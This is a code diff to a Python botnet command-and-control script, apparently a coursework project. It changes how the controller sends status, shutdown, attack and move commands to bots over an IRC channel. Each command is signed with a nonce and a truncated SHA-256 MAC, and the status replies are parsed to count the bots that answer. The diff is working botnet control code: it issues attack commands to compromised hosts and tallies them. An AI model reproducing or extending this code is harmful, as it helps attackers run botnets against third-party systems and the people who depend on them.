@@ -64,6 +64,7 @@ def recieve_status_data(sock: socket, channel: str):
     j = 0
     bot_status = list()
     parse_irc_data = []
+    find_bot = list()
     while i < 5:
         read_data = [sock]
         write_data = []
@@ -77,14 +78,32 @@ def recieve_status_data(sock: socket, channel: str):
             #waits for 5 seconds
             i = i + 1
     
-    find_bot = []
+    #find_bot = []
     for elem in bot_status:
         if(elem.find('! \r\n')):
-            find_bot = elem.split('! \r\n')
+            #print(elem.split('! \r\n'))
+            elem_split = elem.split('\r\n')
+            #find_bot.append(elem_split)
+            for elem2 in elem_split:
+                #if(elem2.find('shutdown') or elem2.find('status')):
+                find_bot.append(elem2)
+                #print(elem2)
+                if(elem2.find("QUIT") != -1):
+                    find_bot.remove(elem2)
+    
 
-    print("Result: ", len(find_bot) - 1, " bots discovered.")
+    for i in find_bot:
+        if(i == ""):
+            find_bot.remove("")
+        elif(i == "\r\n"):
+
+            find_bot.remove(i)
+
+    #print("BOT FOUND: ", find_bot)
+
+    print("Result: ", len(find_bot), " bots discovered.")
     status_string = ""
-    for bot in bot_status:
+    for bot in find_bot:
         print(bot)
 
 
@@ -121,7 +140,7 @@ def bot_controller(args: str, sock: socket):
 
             #nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
             nonce_mac_cmd = 'PRIVMSG ' + channel + " :" + nonce + " " + mac[0:8] + " " + command + '! \r\n'
-            print("send command: ", nonce_mac_cmd)
+            #print("send command: ", nonce_mac_cmd)
             sock.send(nonce_mac_cmd.encode())
             recieve_status_data(sock, channel)
 
@@ -132,11 +151,12 @@ def bot_controller(args: str, sock: socket):
             mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
             #print("mac: ", mac[0:8])
 
-            nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
+            #nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
+            nonce_mac_cmd = 'PRIVMSG ' + channel + " :" + nonce + " " + mac[0:8] + " " + command + '! \r\n'
             #print("send command: ", nonce_mac_cmd)
             sock.send(nonce_mac_cmd.encode())
-
-            recieve_shutdown_data(sock)
+            recieve_status_data(sock, channel)
+            #recieve_shutdown_data(sock)
 
         elif command[0:6] == "attack":
             print("attack command")
@@ -144,11 +164,13 @@ def bot_controller(args: str, sock: socket):
             mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
             #print("mac: ", mac[0:8])
 
-            nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
+            #nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
+            nonce_mac_cmd = 'PRIVMSG ' + channel + " :" + nonce + " " + mac[0:8] + " " + command + '! \r\n'
             #print("send command: ", nonce_mac_cmd)
             sock.send(nonce_mac_cmd.encode())
 
-            recieve_attack_data(sock)
+            recieve_status_data(sock, channel)
+            #recieve_attack_data(sock)
 
         elif command[0:4] == "move":
             print("move command")
@@ -156,11 +178,13 @@ def bot_controller(args: str, sock: socket):
             mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
             #print("mac: ", mac[0:8])
 
-            nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
+            #nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
+            nonce_mac_cmd = 'PRIVMSG ' + channel + " :" + nonce + " " + mac[0:8] + " " + command + '! \r\n'
             #print("send command: ", nonce_mac_cmd)
             sock.send(nonce_mac_cmd.encode())
 
-            recieve_attack_data(sock)
+            recieve_status_data(sock, channel)
+            #recieve_attack_data(sock)
         elif command == "quit":
             print("Bye.")
             exit(1)
